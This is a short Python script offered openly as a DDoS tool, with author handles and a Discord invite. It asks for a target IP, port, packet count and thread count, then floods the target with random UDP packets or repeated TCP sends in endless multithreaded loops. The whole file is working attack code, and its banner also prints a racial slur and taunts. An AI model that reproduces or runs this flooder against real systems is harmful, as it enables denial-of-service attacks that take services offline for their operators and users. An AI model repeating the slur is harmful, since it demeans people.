#!/usr/bin/env python3
#SUBSCRIBE 
#Ddos by Papij-hax and Kyuu
#Join My Dc : https://discord.gg/mtHsYBQnkD
import random
import socket
import threading
import os

os.system("clear")
print("DDoSaTtack by Papij-hax, kyuu")
print("DDOSattack by PAPIJ AND TRAPKID, TISAVA")
print("DON'T PLAY WITH US NIGGAS")
ip = str(input(" DdosAttackByPapij | Ip:"))
port = int(input(" DdosAttackByKyuu | Port:"))
choice = str(input(" DdosAttackByTisava | do y?(y/n):"))
times = int(input(" DdosAttackByPapij | Packets:"))
threads = int(input(" DdosAttackByKyuu | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | Papij-hax |")
		except:
			print("[!] | DOWN BOBO|")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PAPIJ, TISAVA ONTOP")
		except:
			s.close()
			print("[*] DOWN KA SAMIN")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
